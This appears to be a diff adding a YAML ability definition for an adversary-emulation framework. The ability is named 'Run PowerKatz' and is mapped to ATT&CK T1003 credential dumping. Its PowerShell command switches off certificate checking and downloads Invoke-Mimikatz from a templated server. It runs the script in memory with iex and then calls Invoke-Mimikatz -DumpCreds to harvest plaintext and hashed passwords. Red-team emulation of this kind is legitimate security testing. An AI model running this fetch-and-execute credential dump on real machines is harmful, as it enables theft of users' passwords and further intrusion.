@@ -1,0 +1,17 @@
+---
+
+- id: baac2c6d-4652-4b7e-ab0a-f1bf246edd12
+  name: Run PowerKatz
+  description: Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  executors:
+    psh:
+      command: |
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
+        $web = (New-Object System.Net.WebClient)
+        $web.Headers.add("file","Invoke-Mimikatz-ps1")
+        $result = $web.uploadString("#{caldera}/file/download","")
+        iex $result; Invoke-Mimikatz -DumpCreds
